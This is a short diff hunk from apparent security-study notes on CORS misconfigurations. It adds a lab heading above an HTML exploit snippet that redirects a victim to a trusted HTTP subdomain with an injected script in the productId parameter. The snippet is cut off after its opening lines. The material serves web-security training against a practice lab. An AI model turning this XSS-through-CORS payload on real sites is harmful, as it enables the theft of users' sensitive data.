@@ -136,6 +136,7 @@ If a website trusts an origin that is vulnerable to cross-site scripting ([[XSS 
 Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP.
 In this situation, an attacker who is in a position to intercept a victim user's traffic (*man-in-the-middle attack*) can exploit the CORS configuration to compromise the victim's interaction with the application.
 
+##### Lab: CORS vulnerability with trusted insecure protocols
 ```html
 <script>  
 location = 'http://stock.0aff008c0471a03181e3434c00ad00c8.web-security-academy.net/?storeId=1&productId=<script>' +  
